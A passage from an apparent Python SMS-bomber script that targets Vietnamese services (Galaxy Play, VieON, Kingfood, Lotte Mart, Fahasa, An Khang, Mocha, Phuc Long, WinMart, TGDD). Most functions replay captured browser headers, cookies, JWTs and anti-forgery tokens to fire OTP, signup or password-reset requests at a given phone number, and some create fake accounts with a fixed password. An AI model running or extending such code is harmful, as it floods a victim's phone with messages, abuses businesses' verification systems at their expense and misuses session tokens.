        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJkMWZiYWMxZi1lYTk2LTQwMjUtOTA1Ny02NDY2MjdiNWUyMjMiLCJkaWQiOiI3MTc4MmY0MS00N2Y4LTRjNGMtYjBmZi0zMzdiN2VhYjliMWYiLCJpcCI6IjE4My44MS41MC4xNTEiLCJtaWQiOiJOb25lIiwicGx0Ijoid2VifHBjfHdpbmRvd3N8MTB8Y2hyb21lIiwiYXBwX3ZlcnNpb24iOiIyLjAuMCIsImlhdCI6MTY5NTczMDU5OSwiZXhwIjoxNzExMjgyNTk5fQ.bVNui-9wMw6kUghS0b5KLRifbvCOo-mT0A0Cl08hcUA',
        # 'content-length': '0',
        'origin': 'https://galaxyplay.vn',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': phone,
    }

    response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)#Thành Công
def vieon1():
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)    
def kingfood():
    headers = {
        'authority': 'api.onelife.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'operationName': 'SendOTP',
        'variables': {
            'phone': phone[1:10],
        },
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
def lotte():
    cookies = {
        '_gcl_au': '1.1.1380052042.1696172508',
        '__Host-next-auth.csrf-token': 'b6731bfa396ae9486e9b6dbd9a774b3f8e203c4a84523e940b7a661f06c65a72%7Cbc35f656244869b44865ab6210819966b891290609d2f44ce4957bf4cb4fc62f',
        '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
        '_ga': 'GA1.1.625673941.1696172509',
        '_fbp': 'fb.1.1696172509630.1101002078',
        '_ga_6QLJ7DM4XW': 'GS1.1.1696172509.1.1.1696172526.0.0.0',
    }

    headers = {
        'authority': 'www.lottemart.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.1380052042.1696172508; __Host-next-auth.csrf-token=b6731bfa396ae9486e9b6dbd9a774b3f8e203c4a84523e940b7a661f06c65a72%7Cbc35f656244869b44865ab6210819966b891290609d2f44ce4957bf4cb4fc62f; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _ga=GA1.1.625673941.1696172509; _fbp=fb.1.1696172509630.1101002078; _ga_6QLJ7DM4XW=GS1.1.1696172509.1.1.1696172526.0.0.0',
        'origin': 'https://www.lottemart.vn',
        'referer': 'https://www.lottemart.vn/signup',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'username': phone,
        'case': 'register',
    }

    response = requests.post(
        'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
###
def fahasa():
    cookies = {
        'frontend': '0b3511cbb4fb44fb82cc79dc6e857e52',
        '_gcl_au': '1.1.1346023506.1696172650',
        '_gcl_aw': 'GCL.1696172650.CjwKCAjwseSoBhBXEiwA9iZtxvI-ZicCQ4x3G4krk5-eJDPOY2vQ68BhH_Lgwi4XIJyvRUQhDVg5KxoC738QAvD_BwE',
        'utm_source': 'google',
        '_ga': 'GA1.1.659809284.1696172654',
        '_tt_enable_cookie': '1',
        '_ttp': '4pKrYeW9wLrYT12gWrf8U0WlNHZ',
        '_clck': '1etycls|2|ffh|0|1369',
        '_fbp': 'fb.1.1696172654442.1688955659',
        'moe_uuid': '7bc6b19b-d5c8-4af8-b224-3ed0b68880f6',
        'USER_DATA': '%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%227bc6b19b-d5c8-4af8-b224-3ed0b68880f6%22%2C%22deviceAdded%22%3Atrue%7D',
        '_ga_460L9JMC2G': 'GS1.1.1696172653.1.1.1696172666.47.0.0',
        '_clsk': 'gtoip|1696172666896|2|1|w.clarity.ms/collect',
    }

    headers = {
        'authority': 'www.fahasa.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'frontend=0b3511cbb4fb44fb82cc79dc6e857e52; _gcl_au=1.1.1346023506.1696172650; _gcl_aw=GCL.1696172650.CjwKCAjwseSoBhBXEiwA9iZtxvI-ZicCQ4x3G4krk5-eJDPOY2vQ68BhH_Lgwi4XIJyvRUQhDVg5KxoC738QAvD_BwE; utm_source=google; _ga=GA1.1.659809284.1696172654; _tt_enable_cookie=1; _ttp=4pKrYeW9wLrYT12gWrf8U0WlNHZ; _clck=1etycls|2|ffh|0|1369; _fbp=fb.1.1696172654442.1688955659; moe_uuid=7bc6b19b-d5c8-4af8-b224-3ed0b68880f6; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%227bc6b19b-d5c8-4af8-b224-3ed0b68880f6%22%2C%22deviceAdded%22%3Atrue%7D; _ga_460L9JMC2G=GS1.1.1696172653.1.1.1696172666.47.0.0; _clsk=gtoip|1696172666896|2|1|w.clarity.ms/collect',
        'origin': 'https://www.fahasa.com',
        'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-5f79623682868c70cb9231f3ffc0c372-801b135f67f68937-01',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
    }

    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
def ankhang():
  cookies = {
      'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
      'MWG_PRODUCT_BASIC_DB': 'FFUR64ug9ExN62Kz0zE1eb7VtmrIbngOLw6_Tc0lv%2FQAduBkrQNV0Q--',
      '_gcl_au': '1.1.1755911141.1696174180',
      '_ga': 'GA1.1.611097042.1696174180',
      '_pk_id.2.b94a': 'af9fd3f158e2bfcf.1696174180.',
      '_fbp': 'fb.1.1696174180012.837280744',
      'TBMCookie_3209819802479625248': '392607001697284474ad8IoD1cFaawDNPXFYkpWjqB2vc=',
      '___utmvm': '###########',
      '.AspNetCore.Antiforgery.PgYZnA9bRvk': 'CfDJ8OzT4w9F3NBBtKYXpiQJSWu5st6jUnhCWq9uOVWucPHkqXvt7YUc83XPzcCN8dH6OSsXgjsSWzVzlJbnlCAVIcNRvzapC60zVU2hMNhrtMtQ3sBe1Wjsu6Qx-u7X2cvreh5zKcc0U_vwzwomvhcQtw4',
      '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
      'SvID': 'ak213|ZSqBg|ZSqBf',
      '_pk_ref.2.b94a': '%5B%22%22%2C%22%22%2C1697284478%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
      '_pk_ses.2.b94a': '1',
      '.AspNetCore.Antiforgery.q5r70a3YBCY': 'CfDJ8EAyW5oxzlJBpu_em4xhyNuSeQ_6B4GBOA6SJi3YqG2bGc2nN0WNENancxRU7PVFsROGbmMFoNZ9_vNhGXaXpl0gnlcraNJTqlzwFz2wQDPyP2E7VRM0Vp259a_5YtqpNwQyo3GEoHQbRGKQnnhxTwY',
      'MWG_CART_SS_10': 'CfDJ8EAyW5oxzlJBpu%2Fem4xhyNtneiaYC7iiehpVN8BWsZUIogk9i6C5NvGAT2oVprfldARZlpoj9guYnXWKQlbYPeO8snmWWT24qlA21T49mo0a85UD75ejhcByoLTu7zrOYUmhQKeWmeoc4lvGp7Z1U6Zp4WxwVWrRHIm34DGib0RH',
      'cebs': '1',
      '_ce.clock_event': '1',
      '_ce.clock_data': '279%2C1.55.45.32%2C1%2C22210ca73bf1af2ec2eace74a96ee356',
      '.AspNetCore.Antiforgery.4PZsHduyjpg': 'CfDJ8ImUV2tmepFDqJx13sccnB5HC0MRq2K9V4PVLOIOzp8DUyV4TL90LEs_bvdhKYLOP6wcWYxcmbCKf02nONk5ItsM2YmiLGa9i3sET2nxyQYalZqEIT6lVNZRVMlv3w-dFoGKF-wmk8K34zK6dVU3wXw',
      'cebsp_': '2',
      '_ga_D1DPPSN7B8': 'GS1.1.1697284478.2.1.1697284488.50.0.0',
      '_ce.s': 'v~05640ed4cbca8cedfb5f924737cbbf40d1e3a5ca~lcw~1697284492034~vpv~1~v11.cs~403690~v11.s~73e30b60-6a88-11ee-903c-9d457b2b7cfe~v11.sla~1697284492035~lcw~1697284492035',
  }

  headers = {
      'Accept': '*/*',
      'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
      'Connection': 'keep-alive',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; MWG_PRODUCT_BASIC_DB=FFUR64ug9ExN62Kz0zE1eb7VtmrIbngOLw6_Tc0lv%2FQAduBkrQNV0Q--; _gcl_au=1.1.1755911141.1696174180; _ga=GA1.1.611097042.1696174180; _pk_id.2.b94a=af9fd3f158e2bfcf.1696174180.; _fbp=fb.1.1696174180012.837280744; TBMCookie_3209819802479625248=392607001697284474ad8IoD1cFaawDNPXFYkpWjqB2vc=; ___utmvm=###########; .AspNetCore.Antiforgery.PgYZnA9bRvk=CfDJ8OzT4w9F3NBBtKYXpiQJSWu5st6jUnhCWq9uOVWucPHkqXvt7YUc83XPzcCN8dH6OSsXgjsSWzVzlJbnlCAVIcNRvzapC60zVU2hMNhrtMtQ3sBe1Wjsu6Qx-u7X2cvreh5zKcc0U_vwzwomvhcQtw4; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; SvID=ak213|ZSqBg|ZSqBf; _pk_ref.2.b94a=%5B%22%22%2C%22%22%2C1697284478%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.2.b94a=1; .AspNetCore.Antiforgery.q5r70a3YBCY=CfDJ8EAyW5oxzlJBpu_em4xhyNuSeQ_6B4GBOA6SJi3YqG2bGc2nN0WNENancxRU7PVFsROGbmMFoNZ9_vNhGXaXpl0gnlcraNJTqlzwFz2wQDPyP2E7VRM0Vp259a_5YtqpNwQyo3GEoHQbRGKQnnhxTwY; MWG_CART_SS_10=CfDJ8EAyW5oxzlJBpu%2Fem4xhyNtneiaYC7iiehpVN8BWsZUIogk9i6C5NvGAT2oVprfldARZlpoj9guYnXWKQlbYPeO8snmWWT24qlA21T49mo0a85UD75ejhcByoLTu7zrOYUmhQKeWmeoc4lvGp7Z1U6Zp4WxwVWrRHIm34DGib0RH; cebs=1; _ce.clock_event=1; _ce.clock_data=279%2C1.55.45.32%2C1%2C22210ca73bf1af2ec2eace74a96ee356; .AspNetCore.Antiforgery.4PZsHduyjpg=CfDJ8ImUV2tmepFDqJx13sccnB5HC0MRq2K9V4PVLOIOzp8DUyV4TL90LEs_bvdhKYLOP6wcWYxcmbCKf02nONk5ItsM2YmiLGa9i3sET2nxyQYalZqEIT6lVNZRVMlv3w-dFoGKF-wmk8K34zK6dVU3wXw; cebsp_=2; _ga_D1DPPSN7B8=GS1.1.1697284478.2.1.1697284488.50.0.0; _ce.s=v~05640ed4cbca8cedfb5f924737cbbf40d1e3a5ca~lcw~1697284492034~vpv~1~v11.cs~403690~v11.s~73e30b60-6a88-11ee-903c-9d457b2b7cfe~v11.sla~1697284492035~lcw~1697284492035",
      'Origin': 'https://www.nhathuocankhang.com',
      'Referer': 'https://www.nhathuocankhang.com/lich-su-mua-hang/dang-nhap',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
      'X-Requested-With': 'XMLHttpRequest',
      'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
  }

  data = {
      'phoneNumber': phone,
      'isReSend': 'false',
      'sendOTPType': '1',
      '__RequestVerificationToken': 'CfDJ8ImUV2tmepFDqJx13sccnB4ARknfeG7jasHc1oxqNP-UzqhtXfrlouaPkZJun19l56zgt9ey-CK06nOdtac42CBvKnaCEpQE8pJmqG2DuF8NaOfgrPo2PRL7PQdJwBNYdO3d3ZNyHDdOnjhSIku8P4s',
  }

  response = requests.post(
      'https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
      cookies=cookies,
      headers=headers,
      data=data,
  )

def mocha():
  headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
  }

  params = {
    'msisdn': phone,
    'languageCode': 'vi',
  }

  response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
def phuclong():
    headers = {
        'authority': 'api-crownx.winmart.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://order.phuclong.com.vn',
        'referer': 'https://order.phuclong.com.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'userName': phone,
    }

    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd', headers=headers, json=json_data)

def winmart_zalo():
    headers = {
        'authority': 'api-crownx.winmart.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://winmart.vn',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-api-merchant': 'WCM',
    }

    json_data = {
        'firstName': 'asdad adsdaw ăd',
        'phoneNumber': phone,
        'masanReferralCode': '',
        'dobDate': '1995-02-14',
        'gender': 'Male',
    }

    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
def tgdd():
    cookies = {
        'TBMCookie_3209819802479625248': '149007001706792818ykwluJizbl6hqtxBuk2j7+TTGmg=',
        '___utmvm': '###########',
        'SvID': 'beline26122|ZbuXd|ZbuXd',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        '_gcl_au': '1.1.1694229339.1706792827',
        '__zi': '2000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NH8rrmEspamLIdtgUvRhRJ52IUfddlDm2KvTuq-6prG5KcpKuCm.1',
        '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1706792827%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_id.7.8f7e': '8502183722ed63db.1706792827.',
        '_pk_ses.7.8f7e': '1',
        '_fbp': 'fb.1.1706792827091.1555958278',
        '_ce.irv': 'new',
        'cebs': '1',
        '_ce.clock_event': '1',
        '_ce.clock_data': '7572%2C1.55.46.91%2C1%2C9c1ce27f08b16479d2e17743062b28ed',
        '_tt_enable_cookie': '1',
        '_ttp': 'xTzgl2_thC9KikRmNlNVkCD5GqS',
        'DMX_Personal': '%7B%22UID%22%3A%2238899a2184e30162f4d47afe8354de1d703ec0af%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8F-U4Yzs1fpHnULPXrQpbBYMn5Y3dqOlUv2xTZLwHAxIsfO9kpGiAdwe8nh2Zc_dZ3WT80tuhJFb5RPHwofFugBmEn5kmFD1lWDkJIXpP3rfZepGpWf5HYN8bZ0ThmUNxtmEvOgjaj4KolB-QfyIHIQ',
        'cebsp_': '2',
        '_ga': 'GA1.2.547655569.1706792827',
        '_gid': 'GA1.2.1457629000.1706792828',
        '_gat': '1',
        '_ga_TZK5WPYMMS': 'GS1.2.1706792828.1.0.1706792828.60.0.0',
        '_ga_TLRZMSX5ME': 'GS1.1.1706792826.1.1.1706792828.58.0.0',
        '_ce.s': 'v~9cd59df1fe3a740935a8d306b27aab199e5c284a~lcw~1706792837405~lva~1706792827256~vpv~0~v11.fhb~1706792827521~v11.lhb~1706792827521~v11.cs~127806~v11.s~cd66dd30-c102-11ee-98d4-5db2477a32f7~v11.sla~1706792837690~lcw~1706792837690',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
